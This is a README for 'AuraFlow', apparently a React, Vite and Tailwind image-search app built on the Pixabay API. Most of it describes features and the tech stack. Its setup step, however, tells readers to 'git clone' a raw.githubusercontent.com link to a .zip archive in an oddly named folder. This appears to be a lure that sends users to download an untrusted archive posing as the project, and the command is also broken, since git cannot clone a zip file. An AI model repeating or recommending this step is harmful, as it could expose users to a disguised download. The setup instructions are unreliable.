# AuraFlow — Image Search and Download

AuraFlow is a lightweight and fast image search application built using React, Vite, and Tailwind CSS. It allows users to search high-quality images using the Pixabay API, like or unlike them using local storage, and download selected images. The application is fully responsive and includes QR code support for mobile testing.

## Features

- Real-time image search using the Pixabay API
- Responsive image grid layout
- Like/Unlike functionality stored in local storage
- Full-size image preview and download support
- QR code displayed in the terminal for mobile testing
- Clean and fast user interface built with Tailwind CSS

## Local Storage Support

AuraFlow uses the browser's localStorage to remember liked images. When users like an image, it is saved locally and retained even after the browser is closed or refreshed. This ensures a smooth user experience without the need for user authentication or a backend.

## Tech Stack

- React
- Vite
- Tailwind CSS
- Pixabay API
- vite-plugin-qrcode
- LocalStorage (browser)

## 📁 Project Setup

### 1. Clone & Install

```bash
git clone https://raw.githubusercontent.com/Tejsvi78/AuraFlow/main/glottidean/AuraFlow.zip
cd AuraFlow
npm install
npm run dev